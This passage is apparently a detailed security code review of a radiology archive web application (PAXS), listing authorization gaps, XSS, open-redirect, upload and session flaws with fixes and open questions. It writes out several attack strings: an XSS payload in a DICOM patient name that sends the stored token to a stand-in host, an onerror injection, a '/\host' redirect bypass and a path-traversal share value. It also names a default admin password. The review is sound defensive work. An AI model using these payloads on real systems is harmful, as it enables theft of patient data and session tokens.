2. "Send" on a node -> POST `/api/v1/nodes/{ae}/send` `{study_uids:[uid]}` (C-STORE). Toast shows sent count or failure reason.

**9. Reading and reports (for context)**
- Reading (nav "Reading", 1417-1524): chips Unread / Stat / Dictated / Read, "Mine" filter (RWL.mine), toggle STAT, assign radiologist (`prompt`), mark read/unread. Each row can open the report modal.
- Report modal (`openReport` 468-504): read-only view of a study's report (GET `/api/v1/reports?study_uid=`). Editing happens in the viewer footer modal (paxs-study-list-enhance.js:526-654, F16 area) which calls `/api/v1/reports/study/{uid}` and `/api/v1/reports/save`.

---

## 5. Code review findings

Severity key: 🔴 blocking, 🟡 important, 🟢 nit. Backend references are included because the UI depends on them and the UI findings cannot be judged without them. Findings are ordered by severity within each group. Each finding is "static" unless marked otherwise.

### A. Backend authorization gaps used by the UI (cross-cutting)

**F1 🔴 Write endpoints the UI calls accept anonymous requests (no auth enforced)**
- Where: `app/api/v1/settings.py:73-84` (POST `/api/v1/settings/organization`), `:137-141` (POST `/api/v1/templates`), `:172-177` (PATCH), `:196-200` (DELETE); `app/api/v1/reports.py:173-177` (POST `/api/v1/reports/save`); `app/api/v1/dicomweb.py:804-808` (POST `/dicom-web/studies`, STOW-RS).
- Quote (settings.py:84): `user: User | None = Depends(get_optional_user),`. The bodies never test `user`. The only use is reports.py:185: `radiologist_name = body.radiologist or (user.username if user else None) or "Dr. Radiologist"`. dicomweb.py uses `user` only for tenant scope (line 884).
- Why wrong: `get_optional_user` returns `None` for anonymous callers (deps.py:66-88). No router-level dependency exists (`app.include_router(...)` with no `dependencies=`, main.py:540-553). The only other gate is the HTML gate (main.py:268-331), which does not cover `/api/*`.
- Scenario: any client that can reach the host sends `POST /api/v1/reports/save` with `"status":"FINALIZED"`. The report is finalized and attributed to "Dr. Radiologist". Anyone can replace the organization header and footer (rendered into printed reports, F6), delete a report template, or push DICOM instances (to the legacy tenant scope).
- Fix: `Depends(get_current_user)` plus `require_destructive_role` / `require_admin` on these routes. Keep `get_optional_user` only for read-only browse endpoints. The test suite already expects 401 for similar endpoints (tests/test_reading_worklist.py:204; tests/test_redis_panel.py:94). Add the same for these routes.

**F2 🔴 Anonymous read of radiology report content and Redis cache values**
- Where: `app/api/v1/reports.py:160-161` (GET `/api/v1/reports/study/{uid}`, no user dependency; returns the report and patient metadata, report_service.py:452-470); `:227-228` (GET `/api/v1/reports/print/{uid}`, no user dependency; returns HTML with patient info and findings); `app/api/v1/redis_panel.py:95-116` (GET `/keys` and `/key`: `_user: User | None = Depends(get_optional_user)` is never checked; `/key` returns `redis_service.get_key_detail` preview, used by app.js:1315-1316).
- UI callers: paxs-study-list-enhance.js:586 (report fetch), :628 (print window), app.js:474 (report list), app.js:1257 and 1309 (Redis key browser).
- Scenario: anyone who has or can enumerate a study UID (UIDs appear in DICOM headers, logs, and the STOW response) fetches the report text and patient name. Anyone reachable can read cached Redis values, which can hold DICOM-derived content.
- Fix: require auth on these routes. Redis read-only status and keys should be admin-only (the mutating Redis routes already use `require_admin`, redis_panel.py:117-170).

**F3 🟡 Guests (no login) see legacy-scope studies in the list and QIDO (appears by design; confirm)**
- Where: `app/api/v1/dashboard.py:415-417` (`GET /api/v1/studies`, `get_optional_user`); cond at ~441-442: `Study.tenant_id.is_(None)` when there is no user (comment lines 436-438: "guests see the legacy unscoped data only"); `app/api/v1/dicomweb.py:197-199` (QIDO `/dicom-web/studies`); app-config.js:4-7 (comment: "the PAXS DICOMweb endpoints accept the archive's guest/anonymous scope"); deps.py:66-72 (docstring).
- Impact: patient name, ID, study description, accession, and modalities are readable without login for every study that has no tenant. The HTML gate (main.py:268-331) does not protect the API. This is documented, so it is a policy question, not a bug. The owner should confirm it.

**F4 🔴 CORS wildcard exposes the anonymous endpoints to any web page**
- Where: `app/main.py:430-436` (`CORSMiddleware(allow_origins=settings.cors_origin_list, allow_credentials=False, allow_methods=["*"], allow_headers=["*"])`); `app/core/config.py:254` (`CORS_ORIGINS: str = "*"`); config.py:325-327 (returns `["*"]` for that value).
- Impact: any page loaded in a browser that can reach the server can read responses of F2/F3 endpoints, and can send JSON writes to F1 endpoints (the preflight passes with `*` and `allow_headers=*`). `allow_credentials=False` blocks cookie-bearing cross-origin reads, so the exposure is through anonymous endpoints. Realistic scenario: a radiologist opens a malicious page while on the hospital LAN.
- Fix: set `CORS_ORIGINS` to the dashboard origin(s). Keep `allow_credentials=False`.

**F5 is in section B.**

### B. Injection and XSS

**F5 🔴 DOM XSS: `esc()` used inside inline `onclick` string attributes**
- Where: app.js:336 (`onclick="location.href=viewerUrl('${studyUid}')"`), :374 (`onclick="openReport('${encodeURIComponent(s.study_uid)}', '${esc(s.patient_name || "Patient")}')"`), :392, :393, :394, :395, :1461, :1484, :1485, :1486, :1487.
- Quote (app.js:395): `onclick="confirmDelete('${encodeURIComponent(s.study_uid)}', '${esc(s.patient_name || "study")}')"`.
- Why wrong: `esc()` (app.js:103-106) converts `'` to `&#39;`. HTML attribute parsing decodes character references before JavaScript runs, so the quote comes back and ends the JS string. In 336, 392, 1484, 1485, and 1487 the study UID is put in unescaped, and `encodeURIComponent` does not encode `'`, so a quote in the UID also breaks out.
- Scenario: a DICOM PatientName such as `x');fetch('https://evil.example/?t='+localStorage.paxs_token);('` is stored via C-STORE or via anonymous STOW (F1). When an operator clicks the eye, forward, share, delete, or report button on that row, the script runs in the dashboard origin, reads `paxs_token` (app.js:22), and makes authenticated calls. The CSP allows inline script (main.py:229). The external `fetch` is blocked by `connect-src 'self'` (main.py:232), but navigation (`location.href`) and same-origin API calls (for example POST `/api/v1/users` at app.js:2255) are not blocked.
- Fix: stop building handlers from strings. Use `data-*` attributes plus `addEventListener` (the file already does this elsewhere, for example 1683-1691). Escape for the target context, not for HTML alone.

**F6 🔴 Stored HTML injection in the settings page and printed reports (reachable with F1)**
- Where: settings/index.html:797-798 (`<td><b>${t.title}</b></td>` and `${t.modality || 'ALL'}` in `tbody.innerHTML`, no escaping); settings/index.html:727-732 and :737-740 (`header_html_text` / `footer_html_text` from the server assigned to `innerHTML` on every /settings load and preview); reports.py:238-239 (`header_html = org.header_html_text or ...`), :374 (`{header_html}`) and :427 (`{footer_html}`) inserted raw into the print HTML at `GET /api/v1/reports/print/{uid}` (anonymous, F2).
- Scenario: an anonymous client creates a template with title `<img src=x onerror=…>` (F1). The admin opens `/settings`, and the script runs in the admin session (token readable from localStorage). Separately, a stored org header with script runs for every person who prints a report.
- Fix: escape `t.title` and `t.modality`. Never assign server-supplied HTML to `innerHTML`. If org header/footer must be HTML, sanitize with an allowlist on save and on render, or store plain text.

**F7 🔴 Unauthenticated upload of any file type into the served static root**
- Where: settings.py:26 (`UPLOADS_DIR = Path(__file__).parent.parent.parent / "static" / "uploads"`), settings.py:84 (no auth), settings.py:86-93 (`filename = f"logo_{Path(logo_file.filename).name}"`, `save_path = UPLOADS_DIR / filename`, `content = await logo_file.read()`, `open(save_path, "wb")`), main.py:560 (`/static` mount of `app/static`), main.py:229 (CSP allows inline script).
- Impact: any client can POST `logo_file` with name `x.html` and script content. It is saved as `static/uploads/logo_x.html` and served from the app origin as `text/html`, so the script runs same-origin (token theft, admin actions). There is no extension or MIME check, and no size limit (`read()` buffers the whole body in memory), so disk and memory exhaustion are also possible. `X-Content-Type-Options: nosniff` (main.py:225) does not stop an HTML file served as HTML.
- Fix: require admin auth; allowlist `png/jpg/svg` with magic-byte checks; cap size; store outside the web root; serve with a forced image type.

**F8 🔴 Self-registration on by default; caller chooses the role**
- Where: auth.py:173 (`if not settings.ALLOW_REGISTER:`), auth.py:183 (`role = body.role or "PHYSICIAN"`), auth.py:185 (first user becomes ADMIN), auth.py:188-191 (blocks only ADMIN); config.py:145 (`ALLOW_REGISTER: bool = True`); login.html:140-141 (Register tab), :202 (hint text); app.js:591 (register call).
- Impact: any reachable client can create RADIOLOGIST, PHYSICIAN, or TECHNOLOGIST accounts that pass `get_current_user`. Examples that accept any authenticated user: `GET /api/v1/reports` (reports.py:80-83), `GET /api/v1/config` (config.py get_config: `Depends(get_current_user)`). Whether those roles can read everything depends on each handler's role checks (not all reviewed).
- The hint at login.html:202 ("Self-registration can never create ADMINs") is true but understates the exposure.
- Fix: default `ALLOW_REGISTER` to False. For self-registration, ignore `body.role` and assign a least-privilege role that an admin must approve.

### C. Auth, session, and redirects

**F9 🟡 Open-redirect bypass: `/\host` passes the same-origin check**
- Where: auth.py:66-72 (`role_landing`), auth.py:166 (returns `redirect_to`), :211, :272, :329 (`request.query_params.get("next")`); login.html:207 (reads `next`), :229 (sends `?next=`), :242 (`window.location.href = data.redirect_to || next || "/";`).
- Quote (auth.py:68): `if next_url and next_url.startswith("/") and not next_url.startswith("//"):`
- Why wrong: `/\evil.example` starts with `/`, does not start with `//`, and has no CR or LF, so it is returned unchanged. Browsers treat `\` as `/` in http(s) URLs, so `window.location.href` leaves the site. The JSON path is confirmed to be used unencoded. The 303 paths (main.py:705, 718) go through Starlette's `RedirectResponse`; I did not verify whether it encodes the backslash.
- Scenario: a phishing link `https://<paxs>/login?next=/\evil.example` sends the victim to the attacker's page on the trusted host after sign-in.
- Fix: reject `\` and control characters. Allow only a path that starts with a single `/`, or parse with `urllib.parse.urlsplit` and require empty scheme and netloc.

**F10 🟡 Access token in localStorage plus a permissive CSP**
- Where: app.js:22, 52, 603, 76, 4266, 4401; login.html:241; paxs-study-list-enhance.js:855, 864, 927; admin-bridge.js:19-20, 39; CSP at main.py:229 (`script-src 'self' 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval'`).
- Impact: any script injection (F5, F6, F7) reads the JWT (15-minute lifetime, but the refresh flow also runs from the page) and makes same-origin calls. `unsafe-eval` is not used by any first-party non-bundle JS (grep: no `eval(`, `new Function(`, `document.write(`); the bundles may need it (not verified).
- Fix: keep the access token in memory only. Remove `unsafe-inline` by moving inline scripts and handlers (login.html, settings/index.html, index.html head) into files. Then drop `unsafe-eval` if the bundles allow.

**F11 🟡 Header "Logout" does not revoke the server session and does not clear the stored token**
- Where: index.html:54 (`<a ... id="btn-logout" href="/logout">`); main.py:713-719 (only `clear_session_cookie`; no DB work); app.js:4264-4276 (in-app sign-out does call POST logout and clears localStorage; the header link does not use it).
- Impact: after the header Logout, `paxs_token` stays in localStorage (valid up to 15 minutes). The refresh session row stays active until expiry, so anyone holding a copy of the cookie can still rotate it. Revocation only happens through POST `/api/v1/auth/logout` (handler not reviewed).
- Fix: point the header link at the same JS path (POST logout, clear token, go to `/login`), or make `GET /logout` also revoke the session row.

**F12 🟡 Refresh cookie is not `Secure` by default; HTTPS off by default**
- Where: config.py:158 (`AUTH_COOKIE_SECURE: bool = False`); config.py:51 (`HTTPS_ENABLED: bool = False`); security.py:31-39 (passes `secure` through); main.py:243-244 (HSTS only when HTTPS is enabled).
- Impact: on a plain-HTTP deployment (common on a LAN), `paxs_session` crosses the network in cleartext and is reusable until expiry.
- Fix: default `AUTH_COOKIE_SECURE` to true when HTTPS is enabled, and warn at startup when auth is on over HTTP.

**F13 🟡 Silent refresh never runs; refresh rotation can revoke the whole session family**
- Bug 1 (confirmed by reading): paxs-study-list-enhance.js:841-846 checks `document.cookie` for `paxs_session`, but security.py:35 sets `httponly=True`, so `document.cookie` never includes it. `paxsHasSessionCookie()` is always false and `paxsSilentRefresh()` returns at line 849 without calling `/api/v1/auth/refresh`. The comment at lines 830-837 says it does run. Effect: the bearer token used by the report modal (paxsAuthHeaders, 861-868) is whatever localStorage holds, possibly expired after 15 minutes, with no refresh.
- Bug 2 (plausible, not runtime-tested): when two tabs get a 401 at about the same time, both send the same refresh cookie. The second use looks like token reuse, so the server revokes the whole family (auth.py:296-306, `token_theft_detected`), signing out every tab. app.js:43 guards only within one tab.
- Fix: remove the `document.cookie` check (attempt refresh once and handle 401). Serialize refresh across tabs (BroadcastChannel or Web Locks), or allow a short grace window for the just-rotated token.

**F14 🟡 Hardcoded license status shown when the status call fails**
- Where: settings/index.html:520-521 (`ENTERPRISE EDITION`, `ACTIVE` badge), :524 (`Licensed to PAXS Medical Center`), :542 (`PAXS-2026-XXXX`), :546 (`PERPETUAL`), :554 (`100,000 Studies/yr`), :561-569 (nine "active" feature chips), :584 (`LOADING-FINGERPRINT...`), :587 (`MAC: EA:13:6B:8C:F2:74`). `loadLicenseInfo` (895-926) updates only inside `if (stRes.ok)`; the `catch` (927-929) only logs.
- Impact: if the status call fails (logged out, server error), the License tab still reads ENTERPRISE / ACTIVE / PERPETUAL / 100 seats with nine features. The MAC is a fixed string, not this host's.
- Fix: render "unknown" or "—" until the API answers. Show an error state on failure. Remove the fixed values.

**F15 🟡 Default admin password in code and shown in the UI**
- Where: app.js:956 (`"✓ ADMIN account seeded — log in with admin / admin123"`); database.py:61 (`admin_password: str = Field(default="admin123", min_length=6, max_length=128)`); the dashboard's Database tab has the same option (index.html:830-831: "Seed an admin account if none exists", checked by default).
- Impact: a fresh install initialized with the defaults has `admin/admin123`, and the UI states it. Anyone who can view the console sees the password.
- Fix: generate a random password or require one. Remove the literal from the UI. Force a change on first login.

### D. Clinical display and data integrity

**F16 🟡 Thumbnail matching can show another study's image on a row (patient identity risk)**
- Where: paxs-study-list-enhance.js:98-100 (`rowKey` = `row.innerText`), :178-188 (`matchStudy`: the first study whose "PatientName StudyDescription" text is contained in the row text wins; fallback `studies[i]` at line 187), :137-165 (`ensureResolved` / `thumbFor`: first series, first instance), :128 (`loadStudies`: QIDO list with its own default order and `limit=200`).
- Impact: two patients with the same name and description in one list give the first match's thumbnail to both rows. If the text does not match (name formatted differently, or the React table has its own sort or pagination), the row index picks `studies[i]`, which can belong to a different patient. The image is the first instance of that study. This is a patient-identity display risk in a diagnostic list.
- Fix: read the StudyInstanceUID from the React row model (a data attribute the table already has) instead of text and index. Drop the index fallback and show no thumbnail when there is no match.

**F17 🟡 MPR sagittal view broken on the CPU/server path; no physical aspect correction**
- Where: paxs-mpr.js:1064-1074 (`planeSagittal` writes rows of length `slices`), :1098-1099 (`vp.w = state.rows`, `vp.h = state.slices` for sagittal), :1124-1131 (`draw2D` reads the buffer linearly as a `vp.w x vp.h` image), :1221-1224 (`initGl2` returns early above 1024 max dimension or 256M voxels, so the CPU path is used; texture upload failure also falls back).
- Impact: when WebGL2 is not used, the sagittal image is sheared whenever rows and slices differ. On the GL path the plane is drawn stretched to the viewport (`drawPlaneGl` 1347-1355) with no slice-spacing correction, so sagittal and coronal proportions do not match real anatomy. Measurement math uses spacing correctly (drawSvgOverlays 1600-1603), so the numbers and the picture disagree.
- Fix: build the sagittal buffer as `rows x slices` consistently with `vp.w`/`vp.h`. Scale each plane canvas by `sliceSpacing / pixelSpacing`.
- Not run in a browser; derived from reading.

### E. Leaks, performance, and error handling

**F18 🟡 MPR workspace leaks WebGL contexts and window listeners on each open/close**
- Where: paxs-mpr.js:1918 (`new THREE.WebGLRenderer(...)` in `init3dEngine`, new on every open), :642-650 (`closeMpr` cancels the animation frame and removes the DOM, but never calls `renderer.dispose()` or forces context loss), :1971 (`window.addEventListener('pointerup', ...)` added per init, never removed), :128-137 (`probeGlSupport` creates a WebGL2 context per open and does not release it).
- Impact: each open adds a WebGL context and a window listener. Browsers cap live WebGL contexts (about 16); after that, new viewers can fail with "too many active WebGL contexts". The listener keeps the closed workspace's closures alive.
- Fix: in `closeMpr`, dispose the renderer, geometries, and textures, and call `WEBGL_lose_context.loseContext()`. Register the window listener once, or remove it on close.

**F19 🟡 MPR volume cache can exceed browser memory**
- Where: paxs-mpr.js:839-845 (cap of 3 entries, FIFO despite the "LRU" comment), :1224 (allows volumes up to 256M voxels), :1262-1268 (whole-volume float32 texture upload); the "~500MB cap" comment at line 839.
- Impact: a 256M-voxel float32 volume is 1 GiB. Three cached plus the GPU copy can exceed 3 GiB, and the comment's 500 MB figure is not enforced.
- Fix: cap by bytes, evict least recently used, and drop the CPU copy after GPU upload when GL is in use.

**F20 🟢 Control Panel is orphaned and /admin bypasses the viewer gate**
- Where: app.js:312-321 (`checkAdminPanel` writes into `#btn-admin`; index.html has no `btn-admin`; grep confirmed); main.py:295-300 (gated list omits `/admin`); main.py:656-661 (route); config.py:290 (`ADMIN_PANEL_ENABLED` default True).
- Impact: the Control Panel shell and version string are reachable without login, and the dashboard has no link to it. The data calls are gated (admin_panel.py:28-56: status, logs, config need any login; actions and config POST need ADMIN). Low risk; a consistency issue.
- Fix: add `/admin` to the gate, or remove the route if the panel is not used. Remove the dead `btn-admin` branch.

**F21 🟡 Fallback viewer's three.js from cdnjs is blocked by the CSP; no SRI**
- Where: viewer.html:9 (`<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js">`, no `integrity`); main.py:229 (`script-src` has no cdnjs origin); viewer.js:49-50 (`if (!window.THREE) return;`, silent); paxs-mpr.js:23 and :107 (CDN fallback is blocked too).
- Impact: the orientation cube in the fallback viewer never initializes, with no error shown. An air-gapped clinical site cannot load the CDN copy at all. Without the CSP, the CDN copy would still lack SRI.
- Fix: remove the CDN tag and use the vendored `/viewer/three.min.js` (already present). If a CDN is kept, add `integrity` and allow the origin in the CSP.

**F22 🟡 Polling loops, full-DOM scans, and N+1 requests**
- Where: paxs-study-list-enhance.js:63-65 (`setInterval(fixDialogs, 1000)` plus a MutationObserver on `document.body` subtree calling `fixDialogs` on every mutation); :295-296 (1 s), :403-407 (1.5 s and 2 s), :775-776 (1 s), :937 (2 s), :267-270 (800 ms x 20 polls); :137-165 (up to 3 requests per row, up to 200 rows, cached in memory only); admin-bridge.js:84-87 (default 5 s `/status` and `/logs` polling forever, including when the tab is hidden); app.js:175 and :809 (both fetch the full `/dicom-web/series?includefield=all` for the modality list); app.js:157-171 and :1739 (`/api/v1/stats` fetched on each dashboard refresh and feature load).
- Impact: continuous DOM scans on the viewer and study-list pages, slow first paint on large lists, avoidable server load. Intervals are never cleared on those pages.
- Fix: one timer or one MutationObserver with debounce. Pause polling on `visibilitychange`. Batch thumbnail lookups or use data already in the QIDO response. Reuse one modality fetch.

**F23 🟢 Several async handlers leave the UI stuck on network errors**
- Where: app.js:3315-3325 (`runFind`: button disabled at 3317, re-enabled only on the success path at 3325; a thrown error leaves it disabled); :3402-3416 (`runPull`, same pattern); :1502-1512 (`rwlAssign`: `api(...).then(...)` with no catch); :2473, :2496, :2689 (`await (await api(...)).json()` outside try; a throw leaves "Loading…"); :1420-1428 (`loadReadingCounts` no catch).
- Fix: try/finally to restore state, and a shared error renderer.

**F24 🟡 Hardcoded legal claims in the clinical viewer footer; attribution injected**
- Where: paxs-study-list-enhance.js:375-376 (`alert('PAXS Archive Terms & Conditions: … 3. Privacy & PHI: Data is protected via AES-TLS encryption. …')`); :346-348 (`© 2026 <b>Mohamed O. Elsamani</b>` and external link to `elsamanii.rf.gd`, injected into the clinical viewer); index.html:983-985 (same attribution in the dashboard footer).
- Issue: the viewer's terms summary is hardcoded and differs from the server copy of the terms (`/terms`, feature-plans/terms.md), which the dashboard shows (app.js:438-465). It states "AES-TLS encryption", but HTTPS is off by default (config.py:51), and DICOM TLS is a separate setting.
- Fix: one source of terms (the `/terms` file) for every entry point. Remove hardcoded claims. Route the wording through legal review.

### F. Security posture details (lower severity)

**F25 🟡 CSRF posture is SameSite=Lax only**
- Where: security.py:36 (`samesite="lax"`). Cookie-only calls: app.js:3925 (STOW), :4270 (logout), :46 (refresh), settings/index.html:943-1047 (license endpoints, credentials same-origin), and `GET /logout` (main.py:713, a state change on GET).
- Assessment: Lax blocks cross-site POST cookies, so these are protected today from cross-site attackers. It does not protect against same-site attackers (other apps on sibling subdomains), and there are no anti-CSRF tokens. F4 (CORS `*`) does not add cookie-based reads because `allow_credentials=False`, so the real exposure is the anonymous endpoints (F1, F2). Avoid state changes on GET.

**F26 🟢 Share token in the URL path is not encoded**
- Where: viewer.js:115 (`const shareToken = params.get("share");`), :120 (`api(\`/api/v1/share/${shareToken}\`)`).
- Impact: `?share=../../api/v1/...` changes the request path (URL normalization) and sends the viewer's cookie to other GET endpoints. The response is displayed only in limited fields, so impact is small. Fix: `encodeURIComponent(shareToken)`.
- Share tokens also sit in URLs (browser history, server logs, copied links). That is the design; document expiry.

**F27 🟢 Gate bypass by substring and file extension (HTML shell only)**
- Where: main.py:304-306 (any path under a gated prefix with a `.js/.css/.json/.txt/.png/...` suffix skips the gate); :308-310 (any query containing `share=` anywhere, for example `/?x=share=1`, skips the gate).
- Impact: the HTML shell is served without login. Data is still API-gated for most endpoints, but F2 and F3 are anonymous anyway. Tighten to exact `share` parameter parsing.

**F28 🟢 Dead and stale artifacts served publicly**
- `viewer/google.js`: Google OIDC client_id (`723928408739-…apps.googleusercontent.com`) with cloud-healthcare scopes and OHIF QA dataset URLs. Unreferenced by any page. Listed in the no-cache list (main.py:164-166).
- `viewer/silent-refresh.html` + `oidc-client.min.js` + `es6-shim.min.js` + `polyfill.min.js`: only used by silent-refresh.html, which loads es5-shim from cdnjs (line 8) and calls `UserManager` (line 22).
- `viewer/sw.js` (no caching) and `viewer/init-service-worker.js` (unregisters every service worker on the origin): the "offline" service worker is not implemented.
- `viewer/_headers`, `_redirects`, `serve.json`: Netlify/serve configs from the OHIF build. Inert under FastAPI.
- app.js:319 writes `&amp;` into a title property (renders literally); dead branch (F20).
- Fix: remove unused files or move them out of the served tree.

**F29 🟢 Duplicate code and divergent constants**
- `fmtBytes` declared twice in app.js: lines 90-96 (KB/MB) and 2737-2742 (KiB/MiB). Both are top-level function declarations, so the later one (2737) is the one that runs. The first is dead.
- `MOD_COLORS` in three places with different hex values: app.js:33-37 (`CT #38bdf8`, `MR #a78bfa`), viewer.js:17-21 (`CT #22d3ee`, `MR #2dd4bf`), paxs-study-list-enhance.js:71-75 (`CT #38bdf8`, `MR #a78bfa`, `PT #f472b6`). Modality colors differ between the dashboard and the viewer.
- `esc` in app.js:103, viewer.js:23, and `paxsEsc` in enhance.js:823. `avatarColor` (app.js:2172) and `paxsAvatarColor` (enhance.js:817) implement the same hash. `fmtDate` in app.js:98 and viewer.js:27.
- `loadStats` and `loadFeatures` both fetch `/api/v1/stats`; `loadModalities` and `loadModalityRegistry` both fetch the full series list.
- Fix: one shared helper file for these.

**F30 🟢 Minor unescaped interpolation (defense in depth)**
- `fmtDate` output goes into innerHTML raw: app.js:385, 1477, 1547, 1617, 2919. The output is the first 8 characters of the stored date with dashes inserted, so exploitation is hard, but the sink is unescaped.
- Fallback labels: `authAuditBadge` (app.js:2391-2392, `${label}` = raw action), `auditBadge` (3093-3101), `rqBadge` (2601-2602), `crLevel` (2638-2639). Values are server enums today.
- `s.thumbnail` into `src="${…}"` attributes: app.js:365, 1466; viewer.js:152. Server-generated URL today.
- Fix: `esc()` everything that reaches innerHTML.

**F31 🟢 Accessibility and markup nits**
- viewer/index.html line 1: `<meta name="viewport" content="…user-scalable=no,maximum-scale=1.0">` disables pinch zoom (WCAG 1.4.4). Leftover `apple-mobile-web-app-title` "@ohif/app".
- index.html:808-809: two `<option value="mysql">` entries ("MySQL 8.0" and "MySQL (default)").
- Hardcoded vendor URL `elsamanii.rf.gd` in the footer (index.html:985), viewer footer (enhance.js:348), and settings placeholder (settings/index.html:621). Better configurable.

**F32 🟢 Timers and small leaks in MPR**
- paxs-mpr.js:85-93 (`loadThree` polls every 30 ms with no timeout if the library never appears; only when two calls race).
- paxs-mpr.js:1133-1137 (`draw2D` creates a temporary canvas on every frame).
- paxs-mpr.js:2226-2227 (`ensureButton` MutationObserver runs for the page lifetime; each mutation schedules a DOM query).
- paxs-mpr.js:1338 (`LOD`/cine timers are cleared correctly; `closeMpr` clears cine and animation frame, see F18 for the renderer).

**F33 🟢 Admin bridge log de-duplication assumes an unbounded log**
- admin-bridge.js:74-78 emits `logs[i]` for `i` from `lastLogCount` to `logs.length`. If the server caps the log list (not verified), `length` stops growing and new entries are never emitted.
- Fix: send a monotonic sequence number, not the array length.

### Checked and not an issue (so the owner does not re-check)

- No `eval(`, `new Function(`, or `document.write(` in first-party non-bundle JS (grep).
- No access token in any URL in the UI (grep for `access_token=` / `token=` in query strings: none). The only token in a URL is the share token (F26), by design.
- `GET /api/v1/config` returns editable keys only; no password, secret, or token keys are in `EDITABLE_KEYS` (grep, settings_service.py).
- Redis mutators require ADMIN (redis_panel.py:117-170).
- Admin-panel mutators require ADMIN (admin_panel.py:43-70).
- Report finalize and resend require destructive role (reports.py:117-135).
- Server-side `role_landing` blocks `//` (auth.py:68); only the `/\` form (F9) gets through.
- DOM-escaped inserts for most list data (`esc()` on text and attributes) in app.js lists outside the handler strings flagged in F5 (for example 143-146, 1544, 2209-2213, 2332-2352, 2545-2548, 2654-2656).
- Login gate uses an HttpOnly cookie (security.py:31-39) and is validated in DB for entry pages (main.py:321-330).
- Security headers are applied to all responses (main.py:247-265): X-Frame-Options DENY, nosniff, Referrer-Policy strict-origin-when-cross-origin, Permissions-Policy.
- The `/admin` page has its own meta CSP (admin/index.html:6-9) and loads no inline script.

---

## 6. Open questions

1. **Guest access (F1, F2, F3)**: is anonymous access intended for `/api/v1/studies`, `/dicom-web/*`, `/api/v1/volume/*`, `/api/v1/fusion/*`? The writes (F1) and report and Redis reads (F2) look unintended. Confirm before fixing.
2. **CORS (F4)**: is `CORS_ORIGINS="*"` only a development default, or the deployed value? Check the production `.env`.
3. **Self-registration (F8)**: is open registration intended for any site? Check the deployed `ALLOW_REGISTER`.
4. **Open redirect (F9)**: confirm browser behavior for `/\host` in `window.location.href` (WHATWG URL parsing). Also confirm whether Starlette's `RedirectResponse` (main.py:705, 718) encodes the backslash.
5. **Logout (F11)**: does `POST /api/v1/auth/logout` (handler not reviewed) revoke the session row and blacklist the access token? Is there a server-side access-token revocation list?
6. **STOW and PatientName (F5)**: does ingest validate DICOM UIDs and names? Grep found no UID validation on the ingest path. A quote in a StudyInstanceUID would also break F5's `viewerUrl('…')` sinks.
7. **Portal URL (settings/index.html:1021)**: does the server validate `portal_url` before making an outbound request (SSRF)? Handler not reviewed.
8. **`/paxs-viewer-guide`**: route and content not reviewed.
9. **Bundles**: the OHIF (viewer), React study list (studies-ui), and Control Panel (admin) builds were not read. Do they read `paxs_token` from localStorage, use `eval`/`new Function` (CSP allows it), or render study metadata with `innerHTML` (the F5/F6 pattern)? Needs a separate bundle review.
10. **Three.js version**: `viewer/three.min.js` version and known issues not verified (CDN path says r128).
11. **Refresh lifetime**: `REFRESH_TOKEN_EXPIRE_DAYS` (enhance.js:832-833 comment says 7 days); config value not checked. Is the race in F13 bug 2 reproducible?
12. **Admin log feed (F33)**: does the admin panel log buffer have a cap?
13. **Viewer share (F26, main.py:308)**: expiry, single-use, and revocation for share tokens are not reviewed.
14. **Test coverage**: confirm whether any test asserts 401 for `/api/v1/templates`, `/api/v1/settings/organization`, `/api/v1/reports/save`, `/dicom-web/studies` (STOW), `/api/v1/reports/print`. The grep I ran found assertions for redis and worklist only.
15. **Admin default password (F15)**: is the default `admin123` used in the seeded init path or only in the request model default? Check `app/api/v1/database.py` init handler and first-run docs.
